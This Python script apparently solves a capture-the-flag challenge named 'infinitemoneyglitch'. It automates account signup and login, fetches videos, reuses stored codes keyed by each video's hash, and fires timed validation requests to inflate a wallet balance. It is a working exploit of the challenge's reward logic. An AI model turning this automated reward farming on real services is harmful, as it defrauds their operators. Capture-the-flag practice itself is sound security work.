from requests import *
from bs4 import BeautifulSoup as bs4
from hashlib import sha1
import time, threading
import os
import json


def getWalletAmount(s: Session):
    account = s.get("http://infinitemoneyglitch.chall.malicecyber.com/account")

    if account.status_code == 200:
        parsedAccountText = bs4(account.text, "html.parser")
        account = parsedAccountText.findAll(class_="account")[0]
        amount = float(
            account.find_all("p")[6]
            .text.replace("\nWallet : ", "")
            .replace("€\n", "")
            .replace(" ", "")
        )

    return amount


def signup(s: Session, email, password):
    signupData = {
        "email": email,
        "username": "0xNath",
        "firstname": "Nathanael",
        "lastname": "Renaud",
        "confirm_password": password,
        "password": password,
        "submit": "Log+In",
    }

    s.post("http://infinitemoneyglitch.chall.malicecyber.com/signup", data=signupData)


def login(s: Session, email, password):
    authenticationData = {"email": email, "password": password, "submit": "Log+In"}

    s.post(
        "http://infinitemoneyglitch.chall.malicecyber.com/login",
        data=authenticationData,
    )

    if len(s.cookies) != 1:
        return False

    return True


def downloadVideo(s: Session, uuid: str) -> None:
    request = s.get(
        f"http://infinitemoneyglitch.chall.malicecyber.com/stream/{uuid}", stream=True
    )

    if request.status_code == 200:
        video = bytes()

        for videoChunk in request.iter_content(chunk_size=1024):
            video += videoChunk

        videoHash = sha1(video).hexdigest()

        with open(f"./videos/{videoHash}.mp4", "wb") as fileForVideo:
            fileForVideo.write(video)

        with open(f"./videoCodes.json", "rt+") as videoHashAndCodeStream:
            videoHashAndCode = json.loads(videoHashAndCodeStream.read())
            if videoHash not in videoHashAndCode.keys():
                videoHashAndCodeStream.seek(0)
                videoHashAndCodeStream.truncate(0)
                videoHashAndCode.update({videoHash: ""})
                videoHashAndCodeStream.write(json.dumps(videoHashAndCode))
            else:
                return (videoHash, videoHashAndCode[videoHash])


def getVideoInfo(s: Session) -> str:
    request = s.get("http://infinitemoneyglitch.chall.malicecyber.com/video")

    if request.status_code == 200:
        parsedRequestText = bs4(request.text, "html.parser")
        video = parsedRequestText.find_all("video")[0]
        videoUUID = video.source["src"].replace("/stream/", "")

    return videoUUID


def validateVideo(s: Session, videoUUID, videoCode):
    request = s.post(
        "http://infinitemoneyglitch.chall.malicecyber.com/validate",
        headers={"Content-Type": "application/json"},
        json={"uuid": videoUUID, "code": videoCode},
    )

    if request.status_code != 200:
        print(request.json())


def getHashList():
    uniqueHashList = []

    hashFilesList = os.popen('ls ./videos/ | grep "hash"').read()
    hashFilesList = hashFilesList.split("\n")

    for file in hashFilesList:
        try:
            with open(f"./videos/{file}", "rt") as f:
                hash = f.read()

                if hash not in uniqueHashList:
                    uniqueHashList.append(hash)
        except:
            pass

    return uniqueHashList


if __name__ == "__main__":
    with open("auth", "rt") as authInfo:
        authInfoValues = authInfo.read()
    
        email = authInfoValues.split(" ")[0]
        password = authInfoValues.split(" ")[1]
    
    s = session()
    
    s.get("http://infinitemoneyglitch.chall.malicecyber.com/login")
    
    if login(s, email, password):
        print("Successful authentication.")
        print(f"Account wallet : {getWalletAmount(s)} €")
    else:
        print("Registration needed...")
        signup(s, email, password)
        print("registration done.")
    
    
    threadPool = []
    
    print(f"Still {500 - int(getWalletAmount(s)  * 10)} requests to do")
    print(f"Beginning at {time.ctime()}")
    
    for i in range(0, 500 - int(getWalletAmount(s) * 10)):
        try:
            videoUUID = getVideoInfo(s)
            videoHash, videoCode = downloadVideo(s, videoUUID)
            threadPool.append(
                threading.Timer(21, validateVideo, [s, videoUUID, videoCode]).start()
            )
        except Exception as e:
            print(e)
            pass
    
    threadPool.append(
        threading.Timer(
            21,
            print,
            [
                f"Done.",
            ],
        ).start()
    )
